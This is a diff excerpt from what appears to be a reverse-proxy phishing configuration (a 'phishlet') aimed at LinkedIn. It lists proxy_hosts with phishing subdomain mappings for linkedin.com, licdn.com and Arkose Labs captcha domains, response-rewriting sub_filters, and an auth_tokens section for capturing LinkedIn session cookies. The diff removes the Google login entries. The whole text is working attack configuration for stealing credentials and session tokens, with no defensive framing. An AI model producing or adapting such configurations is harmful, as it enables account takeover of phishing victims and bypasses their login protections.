@@ -8,8 +8,6 @@ proxy_hosts:
   - {phish_sub: 'static-exp1', orig_sub: 'static-exp1', domain: 'licdn.com', session: false, is_landing: false}
   - {phish_sub: 'media-exp1', orig_sub: 'media-exp1', domain: 'licdn.com', session: false, is_landing: false}
   - {phish_sub: 'realtime.www', orig_sub: 'realtime.www', domain: 'linkedin.com', session: true, is_landing: false}
-  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
-  - {phish_sub: 'google', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false}
   - {phish_sub: 'iframe', orig_sub: 'iframe', domain: 'arkoselabs.com', session: false, is_landing: false}
   - {phish_sub: 'iframe', orig_sub: 'iframe', domain: 'arkoselabs.cn', session: false, is_landing: false}
   - {phish_sub: 'linkedin-api', orig_sub: 'linkedin-api', domain: 'arkoselabs.com', session: false, is_landing: false}
@@ -67,10 +65,6 @@ sub_filters:
   - {triggers_on: 'www.linkedin.com', orig_sub: 'iframe', domain: 'arkoselabs.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'www.linkedin.com', orig_sub: 'iframe', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'www.linkedin.com', orig_sub: '', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-
-  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.linkedin.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
- 
 
 auth_tokens:
   - domain: '.www.linkedin.com'
